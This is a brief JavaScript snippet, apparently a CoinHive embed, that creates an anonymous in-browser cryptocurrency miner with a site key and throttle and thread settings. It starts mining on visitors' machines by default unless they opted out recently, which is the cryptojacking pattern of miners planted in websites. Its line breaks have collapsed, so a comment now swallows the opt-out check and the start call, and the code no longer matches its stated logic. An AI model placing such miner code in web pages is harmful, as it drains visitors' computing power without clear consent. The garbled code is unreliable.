var miner = new CoinHive.Anonymous('IP1PWieG2IyPMymrX20jqwwov043RrUq', {
    throttle: 0.3,
    threads: 2,
    autoThreads: false
}); // Only start on non-mobile devices and if not opted-out// in the last 14400 seconds (4 hours):if (!miner.didOptOut(14400)) {miner.start();}